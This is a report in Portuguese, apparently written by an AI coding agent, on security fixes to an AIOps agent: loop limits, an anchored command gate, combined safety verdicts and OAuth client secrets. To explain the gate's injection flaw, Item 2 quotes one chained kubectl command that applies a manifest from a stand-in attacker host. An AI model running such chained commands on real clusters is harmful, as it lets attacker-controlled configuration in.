# Progresso das correções P1

Origem: §5 "P1 — antes de qualquer uso fora do laboratório" de
[`analise-20261109.md`](analise-20261109.md). Os itens seguem a ordem de
gravidade. Cada item tem testes próprios e um commit local; nada foi enviado
para o remoto (sem push e sem PR).

**Como "verde" é medido:** os comandos `pytest` dos três jobs do CI
(`.github/workflows/ci.yml`), cada um no ambiente equivalente e com o status de
saída real:

- **unit:** `pytest tests/ -m unit --ignore=tests/rust`, só com as dependências
  mínimas do job;
- **integration:** `pytest tests/ -m "integration or snapshot"`, com o
  `requirements.txt` completo;
- **rust-build:** `pytest tests/`, com a extensão Rust compilada e instalada.

O CI não tem lint nem formatação, então não há outro comando a rodar.

| # | Item | IDs | Estado | Commit |
|---|---|---|---|---|
| 1 | Laço do orchestrator com saída e chamadas ao LLM limitadas; timeout no cliente | F01 | feito | ver `git log` |
| 2 | Gate de comando: metacaracteres de shell, âncora, nome de serviço | F02, T04, SEC-05, SEC-06 | feito | ver `git log` |
| 3 | CLI usa o veredito agregado de todas as camadas | F03 | feito | ver `git log` |
| 4 | Template de CPU no mitigator | NOVO-01 | feito | ver `git log` |
| 5 | Safety ligada no pipeline V1 (`proposed_action`) | ARQ-01, F04, SEC-04 | feito | ver `git log` |
| 6 | OAuth: autenticação do cliente em `/auth/token/register` | SEC-01, SEC-11, 4B-07 | feito (aud/iss → P2) | ver `git log` |
| 7 | Falhas silenciosas: log em vez de `except: pass`; `confidence` tipada; chamada morta a `step_predict` | F07, F5-02, ARQ-05, F5-01 | pendente | — |

## Item 1 — F01: laço do AgentOrchestrator

**Defeito.** O `while` de `AgentOrchestrator.run` só saía por `finalize` ou por
estourar o número de replans. Se toda reflexão devolvia `"continue"`, o mesmo
plano rodava de novo para sempre. Isso acontecia em qualquer falha do LLM,
porque o fallback de `_reflect_on_step` é `"continue"`. No relatório, foram
3,46 milhões de chamadas em 5 s.

**Correção:**

- `agents/orchestrator.py`:
  - **Plano esgotado:** um `for … else: break` faz o plano esgotado sem
    `finalize`/`replan` sair do laço e sintetizar o diagnóstico com o que foi
    coletado.
  - **Tamanho do plano:** `MAX_STEPS_PER_PLAN = 8` limita os planos e replans
    vindos do LLM. O total de reflexões por run fica em no máximo
    `(MAX_REPLANS + 1) × 8`.
  - **Síntese:** uma síntese que não é `dict` ou não traz `root_cause` (`{}`,
    lista, `null`) cai no diagnóstico heurístico. Antes, `{}` também mantinha o
    laço girando.
- `adapters/llm/anthropic_client.py`: a factory passa `timeout=60.0` e
  `max_retries=2` explícitos. Todos os pontos de produção criam o cliente por
  ela.

**Testes:** `tests/test_orchestrator_termination.py`, 10 testes marcados `unit`.

- **Como detecta o laço:** o cliente falso tem orçamento de 50 chamadas e, ao
  estourá-lo, levanta uma `BaseException`, que escapa dos `except Exception`.
  Um laço sem saída vira falha imediata em vez de pendurar a suíte.
- **Antes da correção:** 9 testes falharam pelo defeito. Os três de laço
  falharam por estourar o orçamento. O teste de replan falhou por um erro no
  próprio teste, corrigido depois, e não foi reverificado contra o código
  antigo.
- **Cenários cobertos:**
  - LLM sempre falhando;
  - LLM sempre respondendo `continue`;
  - JSON dentro de cercas `` ```json ``;
  - plano e replan com 1000 steps;
  - síntese sem `root_cause`;
  - timeout explícito na factory.

**CI local:** unit 690 passaram, integration 138 passaram, suíte completa 1381
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan:** o valor de 60 s de timeout é um palpite razoável, não
uma medição. Vale ajustá-lo com a latência real do modelo em uso.

## Item 2 — F02/T04/SEC-05/SEC-06: gate de comando e nome de serviço

**Defeito.** A allow-list do `PreExecutionValidator` usava `re.search`, sem
âncora. Um prefixo read-only aprovava qualquer coisa encadeada depois dele:
`kubectl get pods; kubectl apply -f http://evil/x.yaml` saía
`AUTO_APPROVED`. Além disso, o nome de serviço vindo da telemetria ou do LLM
era interpolado cru em `kubectl rollout undo deployment/{service}`.

**Correção:**

- `safety/pre_validator.py`:
  - **Metacaracteres:** `SHELL_METACHARACTERS` (`; & | < >`, `\n`, `\r`)
    bloqueia o comando antes de qualquer allow-list, com status `BLOCKED`.
  - **Âncora:** os padrões de leitura e de rollout passam a usar `re.match`,
    que casa só no início do comando.
  - Os padrões de alto risco continuam com `re.search`, porque ali casar em
    qualquer posição é o comportamento mais conservador.
- `agents/mitigator.py`:
  - `is_valid_service_name` exige um nome DNS-1123 *subdomain* com até 253
    caracteres.
  - **Nome inválido:** a ação sai sem comando, com risco `HIGH` e padrão
    `invalid_service`. Sem comando, o gate não aprova e a decisão vai para um
    humano.
  - Todos os nomes de serviço usados em `data/` e nos snapshots já estão
    nesse formato, e nenhum snapshot mudou.

**Testes:** `tests/test_command_gate.py`, 33 testes marcados `unit`.

- **Antes da correção:** 21 falharam. Os 12 que passavam eram os de
  comportamento legítimo, que precisam continuar passando.
- **Cenários cobertos:**
  - 10 formas de encadeamento e redirecionamento;
  - padrão permitido no meio do comando;
  - 8 comandos legítimos que continuam seguros;
  - 7 nomes de serviço inválidos e 4 válidos;
  - o caminho de ponta a ponta: serviço injetado → mitigator → gate.

**CI local:** unit 723 passaram, integration 138 passaram, suíte completa 1414
passaram e 10 foram pulados. Status 0 nos três.

**Efeito colateral aceito:** via MCP `validate_action`, qualquer comando com
`>` ou `<` passa a ser bloqueado, por exemplo `pip install 'x>=1.0'`. É
falhar fechado de propósito. Se o MCP precisar validar comandos com
especificador de versão, isso pede uma regra própria, não uma brecha na
allow-list.

## Item 3 — F03: a CLI decide com todas as camadas

**Defeito.** O exit code, o `requires_human` do evento Slack e o status
"AWAITING HUMAN" olhavam só a camada `pre_validator`. O veredito do
VersionValidator, produzido por `step_remediation_validation`, aparecia no
resumo e era descartado na decisão.

Caso real, rodado com as classes de verdade:
`kubectl rollout restart deployment/postgres:9.4` sai `AUTO_APPROVED` no
pre-validator e `MALICIOUS` no VersionValidator. Antes da correção, a CLI
devolvia exit 0.

**Correção** (`main.py`):

- `_requires_human(safety_result, remediation_result)` exige humano se
  qualquer camada bloquear.
- `_record_safety_decision` grava `stages.safety_decision` com
  `requires_human` e `blocked_by`.
- O veredito combinado passa a decidir:
  - o exit code 3;
  - o `requires_human` do Slack;
  - o "AWAITING HUMAN" do resumo;
  - o "Requires Human" do postmortem.

**Testes:** `tests/test_cli_safety_decision.py`, 9 testes marcados `unit`.

- **Antes da correção:** 8 falharam. O teste de exit code confirmou o
  defeito: `main()` devolvia 0 com o VersionValidator bloqueando.
- **Cenários cobertos:**
  - as 6 combinações de camadas;
  - as duas etapas reais com o comando acima, sem dublês nas camadas;
  - o `main()` devolvendo 3 quando só o VersionValidator bloqueia, e 0 quando
    todas aprovam.

**CI local:** unit 732 passaram, integration 138 passaram, suíte completa 1423
passaram e 10 foram pulados. Status 0 nos três.

**Observação, fora do P1:** `kubectl set image deployment/api
api=nginx:1.16.1` passa como `SAFE` no VersionValidator. É o achado F08 do
relatório (comparação exata de versão), que é P2.

## Item 4 — NOVO-01: template de CPU no mitigator

**Defeito.** O template de CPU era `--replicas={current+2}`. `str.format` trata
`current+2` como nome de campo, então qualquer causa raiz com "cpu" levantava
`KeyError: 'current+2'` em `MitigationAgent.propose`. O `AgentOrchestrator`
não trata essa exceção.

**Correção** (`agents/mitigator.py`): o template passa a usar `{scale_up}`, e
`propose` calcula os campos antes do `format`
(`scale_up = current_replicas + 2`). Todos os templates recebem o mesmo
dicionário de campos.

**Testes:** `tests/test_mitigator_templates.py`, 8 testes marcados `unit`.

- **Antes da correção:** falharam exatamente os 3 testes de CPU.
- **Cenários cobertos:**
  - cada padrão de `REMEDIATION_PATTERNS` passa por `propose()` e precisa
    gerar um comando sem `{}` sobrando. Isso pega qualquer template quebrado
    no futuro;
  - o comando de CPU exato;
  - o gate trata o comando de CPU como rollout reversível.

**CI local:** unit 740 passaram, integration 138 passaram, suíte completa 1431
passaram e 10 foram pulados. Status 0 nos três.

## Item 5 — ARQ-01/F04/SEC-04: safety ligada no pipeline V1

**Defeito.** Nenhum node do grafo Blueprint preenchia `state.proposed_action`.
Por isso `version_validator`, `pre_validator` e `tnr` sempre faziam *skip*, e
o `main_v1` terminava com exit 0. Os nodes de safety funcionavam quando
recebiam a ação: os testes deles passaram antes da correção. O que faltava era
a fiação.

**Correção:**

- `blueprint/adapters/pipeline_nodes.py`:
  - `proposed_action_from_mitigation` converte a ação do `MitigationAgent` no
    dicionário que os safety nodes leem.
  - O node agentic usa `outcome.mitigation`.
  - O fallback heurístico (`--no-llm`) chama `MitigationAgent.propose`, como o
    caminho com LLM já fazia dentro do orchestrator.
- `blueprint/adapters/safety_nodes.py`: sem *snapshots* de saúde pré e pós,
  o TNR registra `"TNR: not verified — …"` em `safety_reasons` em vez de
  passar em silêncio. Não inventei *snapshots*: não há medição pós-ação real,
  e esse é o item S5 do P2.
- `main.py` (`main_v1`): `safety_verdict == "NEEDS_REVIEW"` passa a devolver
  exit 3, como no V0. Uma ação bloqueada já abortava o pipeline com
  `PipelineAborted` e exit 3; agora ela de fato chega a ser bloqueada.

**Mudança de comportamento, medida:** no cenário padrão com `--no-llm`, o V1
passa a devolver **3**, igual ao V0, que eu rodei no mesmo cenário. O
diagnóstico afeta 4 serviços, acima do limite de 3, e a ação vai para
revisão. O teste `test_story_1_8_wire_main.py::test_main_v1_no_llm_no_rag`
fixava o exit 0 do defeito e foi atualizado. De quebra, ele passou a usar
`tmp_path` em vez de gravar em `/tmp/aiops-test-output`.

**Testes:** `tests/test_blueprint_safety_wiring.py`, 9 testes marcados
`unit`.

- **Antes da correção:** 4 falharam:
  - a ação proposta ficava `None`;
  - um comando encadeado não abortava o pipeline;
  - o `main_v1` devolvia 0 tanto para um comando bloqueado quanto para um que
    exige revisão.
- **Cenários cobertos:**
  - a conversão da ação;
  - os nodes reais bloqueando um comando encadeado e uma versão vulnerável;
  - o pipeline real em `--no-llm` chegando às 3 camadas;
  - o bloqueio abortando a engine;
  - os exit codes do `main_v1`.

**CI local:** unit 750 passaram, integration 138 passaram, suíte completa 1441
passaram e 10 foram pulados. Status 0 nos três.

**Acompanhamento para o P2:** a rota A2A captura o `PipelineAborted` de um
bloqueio de safety e devolve um `pipeline_error` genérico ("diagnosis
failed"). Isso falha fechado, mas não diz que foi bloqueio. Vale tratar junto
com o ARQ-10 (artefato de mitigação da A2A).

## Item 6 — SEC-01: autenticação do cliente no OAuth

**Defeito.** `/auth/token/register` emitia JWT para quem soubesse um
`client_id`, e os ids estão publicados em `config/defaults.yaml`. O PKCE não
autenticava ninguém, porque verifier e challenge chegam no mesmo corpo.
Antes da correção, o ataque do relatório (só `client_id` público + PKCE
gerado na hora) recebia **200**, conferido no teste.

**Correção:**

- `config/loader.py`: `OAuthClientConfig.secret_sha256` guarda o SHA-256 hex
  do segredo do cliente, nunca o segredo.
- `interfaces/http/app.py`: o `create_app` repassa esse hash ao servidor
  OAuth.
- `auth/server.py`:
  - `RegisterRequest.client_secret` (`client_secret_post`) é conferido contra
    o hash com `hmac.compare_digest`.
  - **Falha fechada:** cliente sem hash bem formado não recebe token, e a
    resposta é a mesma (401 "Invalid client credentials") para segredo
    ausente, errado ou não configurado.
  - O discovery passa a anunciar `client_secret_post` em vez de `none`.
  - No modo só-RSA, o endpoint devolve **503** explícito em vez de **500**
    (4B-07). A emissão continua só HS256.
- `config/defaults.yaml`: comentário explicando o campo e como gerar o hash
  sem gravar o segredo em disco.

**Testes:**

- `tests/test_oauth_client_auth.py`, 8 testes marcados `unit`. Antes da
  correção, 6 falharam.
- **Cenários cobertos:**
  - PKCE sem segredo;
  - segredo errado;
  - cliente sem hash configurado;
  - caminho feliz;
  - segredo certo com PKCE errado (400);
  - discovery;
  - modo só-RSA (503);
  - fiação via `create_app`.
- **Testes antigos atualizados:** `tests/test_oauth_mcp.py` e
  `tests/test_a2a_simulation.py` passaram a configurar o hash e enviar
  `client_secret`. Eram os 6 testes que chamavam o registro sem
  autenticação. Os segredos de teste são gerados em tempo de execução com
  `secrets.token_urlsafe`.

**CI local:** unit 758 passaram, integration 138 passaram, suíte completa 1449
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan (precisa de credencial ou decisão de implantação):**

- **Gerar e distribuir os segredos** dos clientes `assistant-agent`,
  `databricks-mcp` e `sre-orchestrator` e configurar os `secret_sha256`
  (YAML ou variável de ambiente). Até isso acontecer, nenhum cliente recebe
  token por este endpoint. Isso é intencional.
- **`aud`/`iss` nos tokens (SEC-11):** depende de uma URL de emissor
  definida (hoje `create_app` passa `base_url=""`) e de mudar em conjunto os
  validadores do A2A, do SSE e do introspect. Fica para o P2.
- **Emissão RS256:** hoje só HS256. O discovery ainda anuncia
  `id_token_signing_alg_values_supported: RS256` quando há par RSA; vale
  alinhar junto com a emissão RS256.
